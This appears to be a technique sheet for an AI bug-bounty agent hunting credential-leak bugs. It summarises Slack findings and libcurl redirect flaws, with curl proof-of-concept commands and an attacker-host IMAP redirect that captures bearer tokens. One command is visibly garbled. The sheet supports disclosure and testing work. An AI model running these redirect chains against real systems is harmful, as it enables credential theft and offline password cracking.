---
name: hunter-l3-insufficiently-protected-credentials
description: "Use when hunting Insufficiently Protected Credentials on a target. Loads the L3 technique sheet: This class covers bugs where credential material — passwords, hashed passwords, session tokens, OAuth2 bearer tokens, cookies, Digest auth state, TLS client certificates — is exposed, leaked cross-ori"
domain: cybersecurity
subdomain: web
tags:
- web
- insufficiently-protected-credentials
- hunting
- l3
version: '1.0'
---

# Insufficiently Protected Credentials — Technique Sheet

## Overview

This class covers bugs where credential material — passwords, hashed passwords, session tokens, OAuth2 bearer tokens, cookies, Digest auth state, TLS client certificates — is exposed, leaked cross-origin, or left behind in ways the owner cannot control. In the records it appears in two very different habitats: (1) client-side library flaws where libcurl fails to clear credential state on cross-origin/cross-protocol redirects, and (2) application-level leaks (WebSocket transmissions, leftover data on uninstall/reinstall) where secrets traverse untrusted channels or persist on shared machines. It pays on programs with desktop apps, libraries, and any flow where a redirect or lifecycle event (uninstall, invite, revoke) touches credential state — the impact is almost always direct credential capture, which is top-tier severity.

## Distinct sub-patterns

### Sub-pattern 1: Hashed password broadcast over WebSocket to workspace members

- **Endpoint shape / parameter:** WebSocket connection on `app.slack.com`, established when a user creates or revokes a **Shared Invite Link**. No HTTP parameter — the leak rides a WS message frame.
- **Payload that actually fired:** None stated (the secret is the hashed password inside the WS frame, recovered by monitoring encrypted network traffic).
- **Root cause:** When the user performs the Shared Invite Link create/revoke action, the server (or client) transmits a **hashed version of the user's password** to *other workspace members* over the WebSocket channel. The hash is sent to parties who have no business receiving any password-derived material.
- **Impact proven:** Any workspace member monitoring their own (encrypted) network traffic could recover other users' hashed passwords and attempt offline cracking. Slack was forced to **reset affected users' passwords**.
- **Exemplars:** id=1639600 (Slack).

### Sub-pattern 2: Uninstall/reinstall resurrects session — credentials never purged

- **Endpoint shape / parameter:** Slack desktop app on Windows; the "endpoint" is the local filesystem state left behind after uninstall (location not stated in the record).
- **Payload that actually fired:** None — the exploit is a lifecycle sequence: uninstall → reinstall → auto-login.
- **Root cause:** Uninstall does not remove session/credential data, so a fresh install finds the surviving state and authenticates the user **automatically without any credentials**.
- **Impact proven:** On a shared machine, an attacker who reinstalls the app gains **full control of the victim's account** — all messages plus the **team admin panel**.
- **Exemplars:** id=238260 (Slack).

### Sub-pattern 3: OAuth2 Bearer token survives cross-protocol redirect (libcurl)

- **Endpoint shape / parameter:** Any libcurl request using `CURLOPT_XOAUTH2_BEARER` that follows a redirect to a different protocol — concretely an HTTP 301 redirect to `imap://vicitim@attacker:1430/`.
- **Payload that actually fired:** Payload not stated as a full command, but the attacker's capture shows the bearer token inside the IMAP SASL exchange: the base64 `AUTHENTICATE XOAUTH2` initial response containing the **valid, high-privilege Bearer token** (`TOP_SECRET_SESSION_TOKEN` visible in the capture).
- **Root cause:** libcurl correctly **clears username/password** on a cross-protocol redirect but **leaves the OAuth2 bearer token intact** — it is treated as connection config, not as a credential subject to the same cross-origin hygiene.
- **Impact proven:** Valid high-privilege Bearer token captured in base64 by the attacker's IMAP SASL `AUTHENTICATE` exchange.
- **Exemplars:** id=3514263 (curl).
- **Chain steps as recorded:** victim request with bearer token follows 301 redirect → redirect to `imap://vicitim@attacker:1430/` → libcurl clears user/pass but keeps bearer token → attacker captures it in the SASL handshake.

### Sub-pattern 4: Custom `Host` header poisons cookie matching across origins (libcurl)

- **Endpoint shape / parameter:** HTTP redirect chain with a **user-controlled `Host` header**; cookie engine keyed off the header-derived `cookiehost`, which is never recomputed on cross-origin redirect.
- **Payload that actually fired (verbatim):**
  ```
  curl -v -L -c cookies.txt -H "Host: example.com" --resolve b.com:8001:127.0.0.1 --resolve a.com:8000:8000.example... --resolve a.com:8000:127.0.0.1 a.com:8000
  ```
  (as recorded: `curl -v -L -c cookies.txt -H "Host: example.com" --resolve b.com:8001:127.0.0.1 --resolve a.com:8000:127.0.0.1 a.com:8000`)
- **Root cause:** `cookiehost` derived from the custom `Host` header is **not cleared on cross-origin redirects**, so the cookie engine keeps matching (and injecting) cookies against the attacker-chosen hostname instead of the actual connection origin.
- **Impact proven:** Cookie `ccc=secret` set for `example.com` was **sent to `b.com`** after a cross-origin redirect, and cookies `bbb`/`ccc` were **re-injected for `example.com`** — both cross-origin cookie *leak* and cookie *injection*.
- **Exemplars:** id=3516878 (curl).

### Sub-pattern 5: Digest auth state + netrc credentials cross-pollinated across origins (libcurl)

- **Endpoint shape / parameter:** Two-host redirect setup (`hosta.evil.com:8011` → `hostb.corp.com:8012` via `--resolve`), using `--netrc-file` and `--digest`.
- **Payload that actually fired (verbatim):**
  ```
  curl --resolve hosta.evil.com:8011:127.0.0.1 --resolve hostb.corp.com:8012:127.0.0.1 --netrc-file /tmp/test_netrc --digest -L http://hosta.evil.com:8011/login
  ```
- **Root cause:** Two flaws compound: (a) **Digest auth state (nonce, realm) is never cleared on cross-origin redirect**, and (b) `conn->bits.netrc` **bypasses `Curl_auth_allowed_to_host()`**, so hostA's Digest state (attacker-chosen nonce/realm) is combined with hostB's netrc credentials in one Authorization header.
- **Impact proven:** `hostB.corp.com` received an **unsolicited Digest Authorization header** leaking username `corporate_admin` in cleartext plus a response hash computed with the **attacker's nonce** (`realm=evil-realm`) — a textbook offline password-cracking setup.
- **Exemplars:** id=3680038 (curl).
- **Chain steps as recorded:** hostA returns 401 with attacker-chosen nonce/realm; Digest state persists on redirect → `--netrc` supplies hostB credentials; `conn->bits.netrc` bypasses the host allow-list → cross-origin Digest response computed under attacker-controlled challenge.

### Sub-pattern 6: TLS client certificate loaded on any HTTPS redirect target (libcurl)

- **Endpoint shape / parameter:** Cross-origin HTTPS redirect (`https://localhost:PORT/start` → second HTTPS origin), with mTLS configured via `--cert`/`--key`.
- **Payload that actually fired (verbatim):**
  ```
  curl -L --cacert ca.crt --cert client.crt --key client.key https://localhost:PORT/start
  ```
- **Root cause:** curl **copies the configured TLS client certificate into the SSL config unconditionally** and loads it on *any* HTTPS redirect target, with **no origin-bound check** — unlike Authorization/Cookie, which do get origin hygiene. The cert is proof-of-possession material treated as connection config rather than a credential.
- **Impact proven:** The second HTTPS origin received the victim's client cert (`CN=redirect-client`) and returned `ATTACKER-SECRET: accepted redirected mTLS identity redirect-client` — a **real proof-of-possession event**, i.e., the attacker origin authenticated as the victim.
- **Exemplars:** id=3749428 (curl).

## Bypass / chain notes

- **The recurring bypass is the "credential-as-config" gap.** In all four libcurl findings, the same underlying weakness fires: Authorization headers, Cookies, and (in the fixed cases) user/password are origin-bound, but **bearer tokens, Digest state, cookies matched on a header-derived host, and TLS client certs are not**. When hunting libraries, enumerate every credential-ish option and ask "does this get cleared on redirect like the others?"
- **Multi-step chains observed:**
  - Bearer-token capture: victim request → 301 redirect → `imap://` target → token surfaces in SASL `AUTHENTICATE` base64 (id=3514263).
  - Digest + netrc combo: 401 with attacker nonce on hostA → state persists → netrc creds for hostB injected past `Curl_auth_allowed_to_host()` → crackable Digest response (id=3680038).
- **Attacker-controlled crypto parameters are the force multiplier.** Setting your own `nonce` and `realm` (via the first-hop 401) turns an authentication handshake into an offline cracking oracle; the victim's machine does the hashing for you.
- **Local exploit chains:** on shared machines, uninstall→reinstall auto-login needs zero network access — pure state hygiene failure (id=238260).
- **Encrypted-traffic monitoring is a valid demonstration technique** for WebSocket leaks: capture your own TLS-decrypted traffic to prove the hash crosses the wire (id=1639600).

## Gotchas / what NOT to do

- Don't report a redirect-flaw in curl-like clients without proving the credential actually **crossed the wire** — the strong reports here show captured material verbatim (`ccc=secret` sent to b.com, `corporate_admin` Digest header, accepted mTLS identity), not theoretical state confusion.
- Don't conflate "hashed password" with "password" in impact write-ups — but don't undersell it either: the Slack report succeeded because offline cracking of a leaked hash is a real threat and the vendor **reset passwords**, validating impact.
- Local-residue findings (uninstall/reinstall) need a realistic scenario: state the shared-machine context explicitly; on a single-user machine the impact evaporates.
- For `Host`-header cookie issues, note the fix requires both *clearing* the derived `cookiehost` on redirect *and* honoring `Curl_auth_allowed_to_host()` for netrc — a partial fix (one of the two) leaves the chain live.
- Test redirect leaks with `--resolve`-mapped local servers so you fully control both origins; never point these PoCs at third-party systems you don't own.
- Distinguish client-library findings (curl) from app findings (Slack) — they go to different maintainers and require different fixes; a library fix request aimed at an app team stalls.

## Real-world impact examples

- **Slack (id=1639600):** users' hashed passwords transmitted to other workspace members over WebSocket during Shared Invite Link create/revoke; recoverable by network monitoring; Slack **reset affected users' passwords** in response.
- **Slack (id=238260):** uninstall+reinstall of Slack for Windows auto-authenticated the prior user; on a shared machine this yields **full account control including the team admin panel**.
- **curl (id=3514263):** valid high-privilege OAuth2 bearer token (`TOP_SECRET_SESSION_TOKEN`) captured by the attacker's IMAP SASL exchange after a cross-protocol redirect.
- **curl (id=3516878):** cookie `ccc=secret` leaked cross-origin to `b.com` and cookies `bbb`/`ccc` injected back for `example.com` — leak and injection in one PoC.
- **curl (id=3680038):** cleartext username `corporate_admin` plus an attacker-nonce Digest response (`realm=evil-realm`) delivered to `hostB.corp.com`, enabling **offline password cracking** of a corporate admin account.
- **curl (id=3749428):** second HTTPS origin authenticated as the victim's mTLS identity (`CN=redirect-client`) and revealed `ATTACKER-SECRET: accepted redirected mTLS identity redirect-client` — direct proof-of-possession compromise.